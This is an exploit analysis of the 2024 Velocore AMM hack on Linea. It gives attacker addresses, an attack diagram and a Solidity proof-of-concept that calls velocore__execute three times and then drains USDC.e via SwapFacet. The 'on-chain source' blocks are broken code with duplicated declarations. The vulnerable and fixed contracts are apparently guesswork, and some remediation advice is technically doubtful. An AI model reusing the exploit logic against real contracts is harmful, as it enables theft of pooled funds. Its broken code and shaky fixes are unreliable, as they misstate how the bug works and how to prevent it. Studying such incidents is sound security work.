# Velocore — velocore__execute() Repeated Call Pool Accounting Bug Analysis

| Field | Details |
|------|------|
| **Date** | 2024-06 |
| **Protocol** | Velocore |
| **Chain** | Linea |
| **Loss** | ~$6,880,000 |
| **USDC-ETH VLP Pool** | [0xe2c67A9B15e9E7FF8A9Cb0dFb8feE5609923E5DB](https://lineascan.build/address/0xe2c67A9B15e9E7FF8A9Cb0dFb8feE5609923E5DB) |
| **SwapFacet** | [0x1d0188c4B276A09366D05d6Be06aF61a73bC7535](https://lineascan.build/address/0x1d0188c4B276A09366D05d6Be06aF61a73bC7535) |
| **USDC.e Token** | [0x176211869cA2b568f2A7D4EE941E073a821EE1ff](https://lineascan.build/address/0x176211869cA2b568f2A7D4EE941E073a821EE1ff) |
| **Attacker** | [0x8cdc37ed79c5ef116b9dc2a53cb86acaca3716bf](https://lineascan.build/address/0x8cdc37ed79c5ef116b9dc2a53cb86acaca3716bf) |
| **Attack Contract** | [0xb7f6354b2cfd3018b3261fbc63248a56a24ae91a](https://lineascan.build/address/0xb7f6354b2cfd3018b3261fbc63248a56a24ae91a) |
| **Root Cause** | Calling `velocore__execute()` 3 times with the same parameters causes cumulative errors in the pool's internal balance accounting, allowing withdrawal of more USDC.e than actually held |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/Velocore_exp.sol) |

---

## 1. Vulnerability Overview

Velocore is an AMM protocol on the Linea chain where `velocore__execute()` is the core function responsible for updating the pool's internal token balances and VLP (Virtual Liquidity Pool) state. This function contains a bug where the internal accounting state is applied redundantly when called consecutively with identical parameters. The attacker exploited this by calling `velocore__execute()` 3 times in succession to manipulate the pool state, then drained approximately $6.88M USDC.e through 4 sequential operations via the SwapFacet.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: repeated calls to velocore__execute cause duplicate state application
contract ConstantProductPool {
    uint256 internal reserve0;
    uint256 internal reserve1;
    uint256 internal totalVLP;

    function velocore__execute(
        address[] calldata tokens,
        int128[] calldata amounts,
        bytes calldata data
    ) external returns (int128[] memory deltaAmounts) {
        // No duplicate call prevention
        // When amounts are identical, state changes accumulate redundantly
        for (uint i = 0; i < tokens.length; i++) {
            if (amounts[i] > 0) {
                reserve0 += uint128(amounts[i]); // ← Accumulates 3x on 3 calls
            } else {
                reserve1 += uint128(-amounts[i]);
            }
        }
        // delta calculation based on totalVLP — reflects manipulated reserves
        deltaAmounts = calculateDelta(reserve0, reserve1, totalVLP);
    }
}

// ✅ Safe code
function velocore__execute(...) external nonReentrant returns (...) {
    // Snapshot balances before and after the call
    uint256 balanceBefore = IERC20(tokens[0]).balanceOf(address(this));
    // State update
    _updateReserves(tokens, amounts);
    uint256 balanceAfter = IERC20(tokens[0]).balanceOf(address(this));
    // Verify actual balance matches internal accounting
    require(balanceAfter == reserve0, "accounting mismatch");
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: Decompiled_0xe2c67A9B.sol
contract DecompiledStub_0xe2c67A9B {
contract DecompiledStub_0xe2c67A9B {

}
```

```solidity
// File: Stub_0x1d0188c4.sol
contract Stub_0x1d0188 {
contract Stub_0x1d0188 {
    // Unverified contract - source not available
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Query total VLP supply
  │         └─ Capture pre-attack state
  │
  ├─→ [2] velocore__execute(tokens, amounts, data) × 3 calls
  │         └─ Same parameters repeated → internal reserve accumulates 3x
  │         └─ totalVLP accounting error introduced
  │
  ├─→ [3] Query manipulated pool balances
  │         └─ Confirm reserve0/reserve1 overvalued vs. actual
  │
  ├─→ [4] SwapFacet.execute() — 4 sequential operations:
  │         ├─ Op 1: Burn VLP using manipulated state
  │         ├─ Op 2: Receive excess USDC.e
  │         ├─ Op 3: Clean up remaining positions
  │         └─ Op 4: Final USDC.e extraction
  │
  └─→ [5] ~$6.88M USDC.e drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IConstantProductPool {
    function velocore__execute(
        address[] calldata tokens,
        int128[] calldata amounts,
        bytes calldata data
    ) external returns (int128[] memory deltaAmounts);
}

interface ISwapFacet {
    function execute(
        address[] calldata tokenRef,
        int128[] calldata deposit,
        ISwapFacet.SwapPacket[] calldata packets
    ) external payable returns (int128[] memory);
}

contract AttackContract {
    IConstantProductPool constant pool = IConstantProductPool(0xe2c67A9B15e9E7FF8A9Cb0dFb8feE5609923E5DB);
    ISwapFacet constant swapFacet = ISwapFacet(0x1d0188c4B276A09366D05d6Be06aF61a73bC7535);
    IERC20 constant USDC_e = IERC20(0x176211869cA2b568f2A7D4EE941E073a821EE1ff);

    function testExploit() external {
        // [1] Snapshot total VLP supply
        uint256 vlpSupplyBefore = pool.totalVLP();

        // [2] Call velocore__execute 3 times with identical parameters
        address[] memory tokens = buildTokenArray();
        int128[] memory amounts = buildAmounts();
        bytes memory data = buildData();

        pool.velocore__execute(tokens, amounts, data); // 1st call
        pool.velocore__execute(tokens, amounts, data); // 2nd call — cumulative error begins
        pool.velocore__execute(tokens, amounts, data); // 3rd call — accounting distortion complete

        // [3] Confirm manipulated pool balances
        // pool's internal reserve is now recorded at ~3x the actual value

        // [4] Execute 4 operations via SwapFacet — exploiting manipulated state
        ISwapFacet.SwapPacket[] memory packets = buildSwapPackets();
        swapFacet.execute(tokens, new int128[](tokens.length), packets);

        // [5] Collect USDC.e
        uint256 profit = USDC_e.balanceOf(address(this));
        // ~$6.88M USDC.e
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Pool accounting bug (duplicate application from repeated velocore__execute calls) |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (3x repeated velocore__execute + 4 SwapFacet operations) |
| **DApp Category** | AMM DEX (Linea chain) |
| **Impact** | Pool internal accounting distortion → $6.88M USDC.e drained |

## 6. Remediation Recommendations

1. **nonReentrant guard**: Add a reentrancy/repeated-call prevention modifier to `velocore__execute`
2. **Actual balance verification**: Verify `balanceOf` vs. internal reserve match before and after function execution
3. **State snapshot on entry**: Take a state snapshot at function start and compare at exit
4. **Limit call count per transaction**: Detect and block repeated calls with identical parameters within a single transaction

## 7. Lessons Learned

- AMM internal accounting functions must be designed so that state changes are not applied redundantly on repeated calls.
- Low-level pool state mutation functions such as `velocore__execute`, when exposed externally, require strict reentrancy defenses and state integrity verification.
- Unaudited AMM implementations on emerging L2s like Linea are equally susceptible to the same class of accounting bugs.